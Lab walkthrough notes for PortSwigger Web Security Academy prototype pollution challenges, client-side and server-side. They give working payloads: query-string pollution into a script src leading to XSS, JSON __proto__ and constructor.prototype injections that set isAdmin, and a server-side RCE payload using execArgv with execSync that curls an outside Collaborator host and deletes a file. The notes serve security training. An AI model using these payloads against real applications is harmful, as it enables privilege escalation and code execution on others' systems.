
##  [Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)

**Manual**
1. Identify a prototype polution with the following payload: ?__proto__[foo]=bar
2. Open the console and run: Object.prototype.foo
3. You should see bar relfected
4. Read the javescript files and search for any of these sources

```
// URL / location
location.search          // ?foo=bar
location.hash            // #foo=bar
location.href
document.URL

// User input
document.getElementById('x').value
event.data               // postMessage source — high value!

// Storage
localStorage.getItem()
sessionStorage.getItem()
document.cookie

// Network responses
fetch(...)               // response data
XMLHttpRequest           // response data
JSON.parse(...)          // parsed response body
```
5. You should find this: 
let config = {params: deparam(new URL(location).searchParams.toString())};
6. Look for where the config variable goes next. Search for config
7. You will find a gadget: config.transport_url
8. You should find the sink in a script.src. It looks like this
script.src = config.transport_url;
9. Craft a url with this attached to check if foo is rendered in the dom: /?__proto__[transport_url]=foo
10. You should see it in a script tag: <script src="foo"></script>
11. Send the following xss payload: /?__proto__[transport_url]=data:,alert(1);



---


**1. Enable DOM Invader (DONT SKIP SETTINGS CHANGE)**

- [ ]  Open the lab in **Burp's built-in browser**
- [ ]  Click the **Burp Suite logo** (top-right) → go to the **DOM Invader** tab
- [ ]  Toggle **DOM Invader ON**
- [ ]  Click **Attack types** → toggle **Prototype pollution ON**
- [ ]  Click **Reload** to apply the changes

**2. Identify Pollution Sources**

- [ ]  Open **DevTools** (F12) → go to the **DOM Invader tab**
- [ ]  Reload the page and observe that DOM Invader has flagged prototype pollution vectors in the query string
- [ ]  Click **Test** next to a source to confirm it can pollute `Object.prototype`

**3. Scan for Gadgets**

- [ ]  Click **Scan for gadgets** — a new tab opens and begins scanning
- [ ]  Switch to that new tab, open **DevTools → DOM Invader tab**
- [ ]  Confirm DOM Invader found a gadget — look for it accessing a sink via the **`value`** property (this is the `Object.defineProperty()` bypass specific to this lab)

**4. Trigger the Exploit**

- [ ]  Click **Exploit** next to the identified sink
- [ ]  DOM Invader auto-generates a PoC and triggers `alert(1)` — lab solved ✅

---

**Key concept for this lab:** The developer tried to patch the gadget using `Object.defineProperty()`, but forgot to set an initial `value`. Polluting `Object.prototype` with a `value` property bypasses that defense entirely.
##  [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)

**1. Enable DOM Invader (DONT SKIP SETTINGS CHANGE)**

- [ ]  Open the lab in **Burp's built-in browser**
- [ ]  Click the **Burp Suite logo** (top-right) → go to the **DOM Invader** tab
- [ ]  Toggle **DOM Invader ON**
- [ ]  Click **Attack types** → toggle **Prototype pollution ON**
- [ ]  Click **Reload** to apply changes

**2. Identify Pollution Sources**

- [ ]  Open **DevTools** (F12) → go to the **DOM Invader tab**
- [ ]  Reload the page and confirm DOM Invader has detected **two prototype pollution vectors** in the query string
- [ ]  Optionally click **Test** next to a source to verify `Object.prototype` is successfully polluted

**3. Scan for Gadgets**

- [ ]  Click **Scan for gadgets** — a new tab opens and begins scanning
- [ ]  Switch to that new tab, open **DevTools → DOM Invader tab**
- [ ]  Confirm DOM Invader found the **`transport_url`** gadget accessing the **`script.src`** sink

**4. Trigger the Exploit**

- [ ]  Click **Exploit** next to the sink
- [ ]  DOM Invader auto-generates a PoC and triggers `alert(1)` — lab solved ✅

---

**Key concept for this lab:** The `transport_url` property on a `config` object is used to dynamically inject a `<script>` tag into the DOM. Since it's never explicitly set, polluting `Object.prototype` with `transport_url` causes the script to inherit your value as its `src`, enabling DOM XSS via a `data:` URL payload.

##  [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)

**1. Enable DOM Invader**

- [ ]  Open the lab in **Burp's built-in browser**
- [ ]  Click the **Burp Suite logo** (top-right) → go to the **DOM Invader** tab
- [ ]  Toggle **DOM Invader ON**
- [ ]  Click **Attack types** → toggle **Prototype pollution ON**
- [ ]  Click **Reload** to apply changes

**2. Identify Pollution Sources**

- [ ]  Open **DevTools** (F12) → go to the **DOM Invader tab**
- [ ]  Reload the page and confirm DOM Invader detected a prototype pollution vector in the query string

**3. Scan for Gadgets**

- [ ]  Click **Scan for gadgets** — a new tab opens and begins scanning
- [ ]  Switch to that new tab, open **DevTools → DOM Invader tab**
- [ ]  Confirm DOM Invader found the **`sequence`** gadget accessing the **`eval()`** sink

**4. Fix the Broken PoC and Trigger the Exploit**

- [ ]  Click **Exploit** — notice the `alert()` does **not** fire (the auto-generated PoC is broken)
- [ ]  Go back to the **previous tab** → look at the `eval()` sink in DOM Invader
- [ ]  Notice a **numeric `1` has been appended** after the canary string in the payload (the JS code does `sequence + 1`, turning the string into `alert(1)1`)
- [ ]  Click **Exploit** again to open the PoC tab
- [ ]  In the URL bar of that new tab, append a **minus sign `-`** to the end of the URL and reload
- [ ]  `alert(1)` fires — lab solved ✅

---

**Key concept for this lab:** The `sequence` property is passed to `eval()`, but the code appends `1` to it (e.g. `a + 1`), which breaks the payload. Appending `-` turns the injected value into `alert(1)-1`, which is valid JS that evaluates the `alert` before the arithmetic, making it execute cleanly.

##  [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)

1. Use the dom invader to explot the server.
2. Craft the following payload for the exploit server:
```html
<script> location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29" </script>
```




##  [Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

- [ ]  Log in as `wiener:peter`, go to your account page
- [ ]  Submit the billing/address form, capture `POST /my-account/change-address` in Burp Proxy
- [ ]  Send that request to **Repeater**
- [ ]  Inject into the JSON body to test for pollution:

json

```json
  "__proto__": { "foo": "bar" }
```

- [ ]  Confirm pollution — response should reflect `"foo": "bar"` (but no `__proto__` key)
- [ ]  Notice `"isAdmin": false` in the response — that's your gadget
- [ ]  Change payload to:

json

```json
  "__proto__": { "isAdmin": true }
```

- [ ]  Send — confirm response now shows `"isAdmin": true`
- [ ]  Refresh the browser — admin panel link should appear
- [ ]  Go to admin panel → delete user **carlos** ✅

##  [Detecting server-side prototype pollution without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)

- Log in as `wiener:peter`, go to your account page
- [ ]  Submit the billing/address form, capture `POST /my-account/change-address` in Burp Proxy
- [ ]  Send the request to **Repeater**
- [ ]  Inject `__proto__` with an arbitrary property and send:

json

```json
  "__proto__": { "foo": "bar" }
```

- [ ]  Notice the response **does NOT reflect** `foo` — no obvious pollution confirmation
- [ ]  **Break the JSON syntax** (e.g. delete a trailing comma) and send — you should get a `500` error with a JSON error object
- [ ]  Note the `status` value in the error response (e.g. `400`)
- [ ]  **Fix the JSON syntax**, then inject a custom `status` value between 400–599:

json

```json
  "__proto__": { "status": 555 }
```

- [ ]  Send the valid request — confirm you get a normal `200` response
- [ ]  Now **break the JSON syntax again** (same as before) and send
- [ ]  Confirm the error response now shows `"status": 555` and `"statusCode": 555` — matching your injected value ✅
- [ ]  Lab is solved — the matching error codes prove prototype pollution without any property reflection

  

## [Bypassing flawed input filters for server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)

  

- Log in as `wiener:peter`, go to your account page and submit the address change form

- [ ] Find the `POST /my-account/change-address` request in Proxy history → send to Repeater

- [ ] Try `__proto__` pollution — add `"__proto__": {"json spaces":10}` to the JSON body → send. Notice indentation is **unchanged** (filter is blocking `__proto__`)

- [ ] Bypass via `constructor` instead:

  

json

  

```json

"constructor": {

"prototype": {

"json spaces":10

}

}

```

  

- [ ] Send → check Raw response tab, JSON indentation has increased → prototype successfully polluted

  

**Escalate privileges**

  

- [ ] Notice `"isAdmin": false` in the response body

- [ ] Replace the payload with:

  

json

  

```json

"constructor": {

"prototype": {

"isAdmin":true

}

}

```

  

- [ ] Send → confirm `"isAdmin": true` in the response

  

**Delete carlos**

  

- [ ] Refresh the page in the browser → admin panel link now appears

- [ ] Go to the admin panel and delete `carlos`

  

## [Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)

  
  

- Log in as `wiener:peter`, submit the address change form, send `POST /my-account/change-address` to Repeater

- [ ] Add to the JSON body and send:

  

json

  

```json

"__proto__": {

"json spaces":10

}

```

  

- [ ] Check Raw response tab → increased JSON indentation confirms pollution via `__proto__`

  

**Find the RCE gadget**

  

- [ ] Go to the admin panel → notice the **Run maintenance jobs** button (spawns child processes)

  

**Test RCE with Collaborator**

  

- [ ] Replace the pollution payload with:

  

json

  

```json

"__proto__": {

"execArgv":[

"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"

]

}

```

  

- [ ] Send the request, then trigger **Run maintenance jobs** in the admin panel

- [ ] Check Burp Collaborator tab → poll for interactions → DNS hits confirm RCE

  

**Execute the final payload**

  

- [ ] Swap `curl` for the deletion command:

  

json

  

```json

"__proto__": {

"execArgv":[

"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"

]

}

```

  

- [ ] Send the request, then trigger **Run maintenance jobs** again → lab solved

